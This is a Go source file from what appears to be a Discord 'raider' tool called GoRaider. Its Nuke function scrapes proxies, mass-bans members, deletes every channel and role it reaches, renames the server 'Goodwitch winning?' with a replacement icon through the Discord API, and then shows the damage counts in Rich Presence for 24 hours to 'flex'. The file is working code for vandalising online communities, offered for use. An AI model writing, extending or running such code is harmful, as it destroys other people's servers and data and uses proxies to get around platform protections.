package api

import (
	"fmt"
	"time"

	"github.com/goodwitchh/GoRaider/tree/main/rpc"
	"github.com/goodwitchh/GoRaider/tree/main/utils"
	"github.com/fatih/color"
	"github.com/valyala/fastjson"
)

func Nuke(guildName string) {
	coolColour.Println("Scraping proxies now...")

	startProxies := time.Now()
	proxies = utils.GetProxies()
	TotalProxies = len(proxies)
	proxyTime := time.Since(startProxies)

	coolColour.Printf("Scraped %d proxies in %s\n", len(proxies), proxyTime)

	nukeTime := time.Now()

	NukeMembers()

	NukeChannels()

	NukeRoles()

	doneNuking = true
	elapsedTime := time.Since(nukeTime)

	coolColour.Printf("Took %s to delete %d channels | %d roles and ban %d people\n", elapsedTime, channelsDeleted, rolesDeleted, banCount)

	utils.SendRequest("PATCH", fmt.Sprintf("https://discord.com/api/v8/guilds/%s", utils.GuildID), "application/json", "", guildData)

	rpc.ChangeRPC(banCount, channelsDeleted, rolesDeleted, len(proxies), elapsedTime, guildName)
	time.Sleep(24 * time.Hour) // we'll flex our RPC for 24 hours
}

var (
	bypassProxy  int  = 0
	coolColour        = color.New(color.FgCyan)
	doneNuking   bool = false
	guildData         = []byte(`{"name":"Goodwitch winning?","icon":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIMAAACDCAYAAACunahmAAAgAElEQVR4nO2dB6xlVfXw970zFMEBRBQRC6AyKmIbHYkdK3ZRVIwVFBSUWKNgAXSsBKOCHYbYEIVRFEvEQkQMErHh2BVBBBQBhaGXmfPlt3N+N+vtOe3O30+//+dZyc17775zzt577bVXX+tMtt12uyqNMEJKafqfnsAI/+/ASAwjzGAkhhFmMBLDCDMYiWGEGYzEMMIMRmIYYQYjMYwwg5EYRpjBSAwjzGAkhhFmMBLDCDMYiWGEGYzEMMIMRmIYYQYjMYwwg5EYRpjB4vjHJZf89T83kxH+bbDttts1fj9yhhFmMBLDCDNYPOCa9KAHPSjttttuadGiRemcc85Jp59+err55pv/78/ufyHssMMO6VGPelS6xS1ukX784x+nn/70p+mmm276T09rGJAd7SeltOCz2WabVSeffHK1bt266oYbbsif66+/vjr77LOrnXbaqZpMJuvd42eXXXaprr766urGG2+s1q5dWwH8fdNNN+W/V65cWW266aaN906n0+qSSy7JY61Zs6a67rrrqquuuqo666yzqv3337/aZJNNWseNn/322y/fz/yZB88744wzqm222ab33qOOOirfw3yvueaaavny5Z3XM+cDDzywuvTSS2f33XzzzdUxxxxTbb311p33brnlltWpp56a58c9J554YvXGN74xr5m58/OZz3xm6/3M7YILLshjcr3r5Vn8fvzxx1dLliyZXR/3PH46xcR73vOe9MQnPjFdccUVaTKZpMWLF6eNNtoo3eMe90hf+cpX0i1vectOQrvuuuvyfevWrUvXXHNNWrt2bf4ersJpqar2LP0bb7wxf7iOZ2y22WaZQ330ox9N++67b55HH9zmNrfJ915//fVpOp3m+S9dujRtvPHGvfdyPR/uZ95dcwUe97jHpUMOOSTd6la3yve47uc///lpv/326xyTa/k/nJcx+cl3junz2oDrWCPj8RP88h0f8dg3/9SlM4D8F73oRXkSm2yySZ6kD+Tvu9/97unZz352/r5rkf/4xz9mRLD55punG264YbbBXcAYzAGCi8gF3vnOd6Zb3/rWvYu74x3vmO+DcHzG1ltvnVl4HzBPxoub0gY8f5999km3ve1t899uJrhhHS9/+cvTne50p95nSLhspuvlA/66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","region":"brazil"}`)
	proxies      []string
	parser       fastjson.Parser
	TotalProxies int
)
